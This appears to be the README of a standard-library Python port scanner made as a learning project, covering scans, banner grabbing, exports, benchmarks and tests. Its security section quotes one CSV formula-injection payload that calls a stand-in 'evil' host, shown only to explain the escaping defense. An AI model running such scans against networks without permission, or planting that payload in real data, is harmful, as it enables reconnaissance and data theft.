# portscanner

A multithreaded TCP port scanner written from scratch in Python, using only the standard library. It finds open ports, grabs service banners, identifies services, and exports results as a table, CSV or JSON.

Built as a learning project to understand how tools like Nmap work underneath: TCP handshakes, concurrency, service fingerprinting, and treating network data as hostile input.

## ⚠️ Legal and ethical use

**Only scan systems you own or have explicit written permission to test.**

Unauthorized port scanning can break laws such as the U.S. Computer Fraud and Abuse Act or the UK Computer Misuse Act, and it can break your ISP's or cloud provider's terms of service. Even when it's legal, scanning someone else's network without consent can trigger their intrusion detection and get your IP address blocked or reported.

This project was developed and tested only against:

- `localhost` / `127.0.0.1`
- [`scanme.nmap.org`](http://scanme.nmap.org/), which the Nmap project provides for this purpose. Scan it lightly (a few times a day at most) and never run heavy or repeated scans against it.

The author accepts no liability for misuse. You are responsible for having permission.

## Features

- **TCP connect scan** that reports each port as `open`, `closed` or `filtered`, with a configurable timeout
- **Worker-pool threading**: up to 1,000 concurrent connections, about 180x faster than sequential in the benchmarks
- **Banner grabbing** using passive reads for talk-first services (SSH, FTP, SMTP) and an HTTP `HEAD` probe for web servers
- **Service detection** from banner signatures, with a fallback to well-known port numbers (shown with `?`)
- **Flexible targets**: an IP, a hostname, a CIDR range (`192.168.1.0/28`), or a comma-separated mix
- **Host discovery** that skips hosts that don't answer, using unprivileged TCP probes (`-Pn` turns it off)
- **Output** as an aligned terminal table, CSV, or JSON with scan metadata
- **Robust error handling**: unresolvable names, unreachable hosts, unwritable output files, and a clean **Ctrl+C** that keeps partial results
- **Defensive by design**: banners are sanitized against terminal escape-code injection, CSV export is protected against formula injection, and there are safety caps on range size and thread count
- **No dependencies**: standard library only. pytest is used for the 80-test suite.

## Installation

Requires Python 3.10+.

```bash
git clone https://github.com/Theo2z/port-scanner.git
cd port-scanner
python -m venv .venv
.venv\Scripts\activate          # Windows
# source .venv/bin/activate     # macOS / Linux
pip install -e ".[dev]"
```

This installs the `portscanner` command. `python -m portscanner` works too.

## Usage

```
portscanner TARGET [-p PORTS] [-t THREADS] [--timeout S] [options]
```

| Option | Description | Default |
|---|---|---|
| `TARGET` | IP, hostname or CIDR range; comma-separate several | (required) |
| `-p`, `--ports` | `80`, `1-1024`, `22,80,8000-8100` | `1-1024` |
| `-t`, `--threads` | concurrent connections per host (1–1000) | `100` |
| `--timeout` | seconds to wait per connection | `1.0` |
| `--no-banners` | skip banner grabbing and service detection | off |
| `--banner-timeout` | seconds to wait for a banner | `2.0` |
| `-Pn`, `--skip-discovery` | scan targets even if they look down | off |
| `--csv FILE` | write open ports to CSV | none |
| `--json FILE` | write full results and metadata to JSON | none |
| `--version` | print the version | |

### Examples

```bash
# Common ports on your own machine
portscanner 127.0.0.1

# A few specific ports, with a longer timeout
portscanner scanme.nmap.org -p 22,80,443 --timeout 2

# A small range of hosts you own, with more threads
portscanner 192.168.1.0/28 -p 1-1024 -t 200

# Fast port check only, no banners, saved to files
portscanner localhost -p 1-65535 --no-banners --csv results/scan.csv --json results/scan.json
```

### Exit codes

| Code | Meaning |
|---|---|
| `0` | Scan completed |
| `1` | A target couldn't be resolved, or an export file couldn't be written |
| `2` | Invalid command-line arguments |
| `130` | Stopped with Ctrl+C. Partial results are still printed and exported. |

## Sample output

```
$ portscanner scanme.nmap.org -p 1-1024 -t 50
Checking which of 1 host(s) are up...

Scanning 1 host(s), 1024 port(s) each, 50 threads, 1.0s timeout

Scan report for scanme.nmap.org (45.33.32.156)
+--------+-------+---------+-------------------------------------------------+
| PORT   | STATE | SERVICE | BANNER                                          |
+--------+-------+---------+-------------------------------------------------+
| 22/tcp | open  | ssh     | SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13      |
| 80/tcp | open  | http    | HTTP/1.1 200 OK | Server: Apache/2.4.7 (Ubuntu) |
+--------+-------+---------+-------------------------------------------------+
Scanned 1024 ports in 21.25s (2 open, 0 closed, 1022 filtered)
```

JSON export (excerpt):

```json
{
  "scanner": "portscanner",
  "version": "0.1.0",
  "generated_at": "2026-11-12T04:23:25+00:00",
  "settings": { "targets": ["scanme.nmap.org"], "ports": "1-1024", "threads": 50, "timeout": 1.0, "...": "..." },
  "hosts": [
    {
      "target": "scanme.nmap.org",
      "ip": "45.33.32.156",
      "elapsed_seconds": 21.249,
      "interrupted": false,
      "ports_scanned": 1024,
      "summary": { "open": 2, "closed": 0, "filtered": 1022 },
      "open_ports": [
        { "port": 22, "state": "open", "service": "ssh", "method": "banner",
          "banner": "SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2.13" }
      ]
    }
  ]
}
```

## Benchmarks

`python benchmarks/benchmark.py` scans 200 ports on `127.0.0.1` with a 0.5 s timeout. It plants 3 listening ports and checks that every run finds exactly those 3.

| Threads | Time (s) | Speed-up |
|--------:|---------:|---------:|
| 1 | 100.31 | 1.0x |
| 10 | 10.17 | 9.9x |
| 50 | 2.06 | 48.6x |
| 100 | 1.05 | 95.6x |
| 200 | 0.55 | 181.0x |

*Windows 11, Python 3.12.* Scanning is I/O-bound: threads spend nearly all their time waiting on the network, and Python's GIL is released during that wait, so the run time is roughly `ceil(ports / threads) × timeout`. The speed-up is almost perfectly linear here because, on Windows, every closed port costs the full timeout (see *Limitations*). On Linux, where closed ports answer instantly, the baseline is faster, so the gain is smaller.

## How it works

### Connect scan: reading the TCP handshake

For each port the scanner asks the OS to complete a normal TCP connection and classifies the result:

| Target's reply | Meaning | State |
|---|---|---|
| SYN/ACK, handshake completes | a service is listening | **open** |
| RST (reset) | host reachable, nothing listening | **closed** |
| nothing before the timeout | a firewall dropped the packet | **filtered** |

A connect scan needs no admin rights, but every open port gets a real, logged connection. That makes it noisier than Nmap's raw-packet SYN scan (`-sS`), which needs root.

### Worker pool

All ports go into a thread-safe `queue.Queue`. A fixed pool of worker threads pulls ports and probes them, and results are collected under a `threading.Lock`. A fixed pool keeps memory and thread-creation costs constant whether you scan 10 ports or 65,535.

### Ctrl+C handling

Python delivers `KeyboardInterrupt` only to the main thread. The main thread waits on the workers with short, repeated `join(timeout=0.2)` calls, so it can react to Ctrl+C right away. When Ctrl+C arrives, it sets a `threading.Event`, workers stop taking new ports, in-flight probes finish, and the partial results are printed and exported.

### Host discovery

Nmap normally pings hosts first, but ICMP needs raw sockets (admin rights) and is often blocked. Instead, the scanner tries 10 common ports in parallel. Any answer, open *or* closed, proves a machine is there. Hosts with no answer are skipped, so a mostly empty CIDR range doesn't cost thousands of timeouts. `-Pn` turns this off.

### Banner grabbing and service detection

Open ports get a second connection. Talk-first services (SSH, FTP, SMTP, POP3, IMAP) are read passively, web ports get `HEAD / HTTP/1.0`, and silent services get a newline nudge. Banners are matched against regex signatures. Only if nothing matches does the scanner fall back to the well-known port table, marking the guess with `?`. A banner is better evidence than a port number, because anyone can run SSH on port 80.

## Security considerations

A security tool handles data from machines it doesn't control, so this one treats every banner as hostile:

- **Terminal escape injection**: a service can send ANSI escape sequences (`\x1b[...`) that clear the screen, hide lines or retitle the terminal when printed. All non-printable bytes are replaced before display, and mostly-binary replies are summarized as `<binary data, N bytes>`.
- **CSV (formula) injection**: a banner such as `=HYPERLINK("http://evil/?"&A1,"click")` would run as a formula when the CSV is opened in Excel. Cells starting with `= + - @` are prefixed with `'`, as OWASP recommends. JSON keeps the raw value.
- **Safety caps**: target expansion is limited to 65,536 hosts, so a `/8` typo fails instead of starting a 16-million-host scan. Threads are capped at 1,000.
- **Input validation**: all targets and ports are parsed and validated before any packet is sent.

## Testing

```bash
python -m pytest
```

80 tests, about 4.5 seconds. Network tests use only `127.0.0.1`, on ports the OS assigns, against throwaway listeners started by fixtures. Conditions that can't be reproduced locally, such as a firewall drop or an unreachable network, are simulated with a fake socket. Ctrl+C is tested with `_thread.interrupt_main()`, which raises a real `KeyboardInterrupt` in the main thread.

| File | Covers |
|---|---|
| `test_targets.py` | port and CIDR parsing, de-duplication, safety caps, invalid input |
| `test_scanner.py` | open/closed/filtered classification, thread-count independence, Ctrl+C, discovery |
| `test_banner.py` | escape-code sanitizing, binary detection, service signatures, live banner grabs |
| `test_output.py` | table alignment, CSV injection defense, JSON structure |
| `test_cli.py` | argument errors, end-to-end scans, exit codes, export failures |

## Project structure

```
portscanner/
├── scanner.py    # connect scan, worker pool, Ctrl+C, host discovery
├── banner.py     # banner grabbing, sanitizing, service detection
├── targets.py    # IP / hostname / CIDR and port-spec parsing (no network code)
├── output.py     # table, CSV, JSON
├── cli.py        # argparse front end, error handling, exit codes
└── __main__.py   # `python -m portscanner`
benchmarks/benchmark.py
tests/
```

## Limitations and future work

- **Windows closed-port timing:** Windows retries the SYN after an RST and only reports "refused" after about 2 s. With `--timeout` below ~2.1 s on Windows, closed ports are reported as `filtered`. Open-port detection is unaffected.
- **IPv4 only.** IPv6 targets are rejected.
- **TCP only.** UDP scanning needs protocol-specific probes.
- **No TLS:** HTTPS and other TLS services aren't decoded. Wrapping the banner socket with `ssl` would expose certificate details.
- **Sequential hosts:** ports are scanned in parallel, but hosts are scanned one at a time.
- Possible extensions: raw-socket SYN scanning (`scapy`), rate limiting, matching versions against a CVE feed.

## License

MIT. See [LICENSE](LICENSE).
